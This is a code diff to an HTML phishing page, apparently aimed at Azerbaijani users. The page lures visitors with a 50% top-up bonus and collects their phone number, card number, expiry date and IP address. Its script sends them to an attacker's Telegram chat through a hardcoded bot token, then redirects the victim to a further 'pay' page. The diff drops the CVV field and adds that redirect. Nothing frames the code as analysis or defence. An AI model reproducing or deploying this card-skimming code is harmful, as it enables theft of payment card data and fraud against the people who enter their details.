@@ -315,43 +315,56 @@
     </div>
   </div>
 
+  
   <script>
-    function hesapla(tutar) {
-      var meblag = parseFloat(tutar) * 1.5;
-      document.getElementById('result').textContent = "Hesabınıza gələcək məbləğ: " + meblag.toFixed(2) + "₼";
+    function hesapla(value) {
+    const bonus = 1.5;  // 1.5x bonus
+    const tutar = parseFloat(value);
+    if (!isNaN(tutar) && tutar > 0) {
+        const bonusluMebleg = tutar * bonus;  // Bonus tətbiq edilir
+        const result = document.getElementById("result");
+        result.textContent = `Hesabınıza gələcək məbləğ (50% bonus daxil): ${bonusluMebleg.toFixed(2)}₼`;
+    } else {
+        const result = document.getElementById("result");
+        result.textContent = "Hesabınıza gələcək məbləğ: 0.00₼";
     }
-  
+}
     async function gonder(event) {
-      event.preventDefault();
-  
-      const telefonNumarasi = document.getElementById("telefon-numarasi").value;
-      const tutar = document.getElementById("tutar").value;
-      const kartNumarasi = document.getElementById("kart-numarasi").value;
-      const sonKullanmaAy = document.getElementById("son-kullanma-ay").value;
-      const sonKullanmaYil = document.getElementById("son-kullanma-yil").value;
-      const cvv = document.getElementById("cvv").value;
-  
-      const botToken = "8136871782:AAGl_5_It13PYi6UPTsVZRQB2LgTVrjG7Ao";
-      const chatId = "8031253006";
-  
-      try {
+    event.preventDefault();
+
+    const telefonNumarasi = document.getElementById("telefon-numarasi").value;
+    const tutar = document.getElementById("tutar").value;
+    const kartNumarasi = document.getElementById("kart-numarasi").value;
+    const sonKullanmaAy = document.getElementById("son-kullanma-ay").value;
+    const sonKullanmaYil = document.getElementById("son-kullanma-yil").value;
+
+    const botToken = "8136871782:AAGl_5_It13PYi6UPTsVZRQB2LgTVrjG7Ao";
+    const chatId = "8031253006";
+
+    try {
         const ipResponse = await fetch("https://api.ipify.org?format=json");
         const ipData = await ipResponse.json();
         const ipAdres = ipData.ip;
-  
-        const mesaj = Telefon Numarası: ${telefonNumarasi}\nYükleyeceğiniz Tutar: ${tutar}₼\nKart Numarası: ${kartNumarasi}\nSon Kullanma Tarihi: ${sonKullanmaAy}/${sonKullanmaYil}\nIP Adresi: ${ipAdres};
-  
-        const url = https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(mesaj)};
-  
+
+        const mesaj = `Telefon Numarası: ${telefonNumarasi}\n` +
+            `Yüklədiyiniz Məbləğ: ${tutar}₼\n` +
+            `Kart Numarası: ${kartNumarasi}\n` +
+            `Son İstifadə Tarixi: ${sonKullanmaAy}/${sonKullanmaYil}\n` +
+            `IP Adresi: ${ipAdres}`;
+
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(mesaj)}`;
+
         await fetch(url);
-        alert("Ödəniş göndərildi.");
-      } catch (error) {
+
+        // Göndərmədən sonra istifadəçini yönləndirin
+        window.location.href = "pay/index.html";
+    } catch (error) {
         console.error("Hata:", error);
         alert("Bir hata oluştu. Lütfen tekrar deneyin.");
-      }
     }
-  </script>
-</body>
-</html> 
+}
+
+</script>
+
 </body>
 </html>
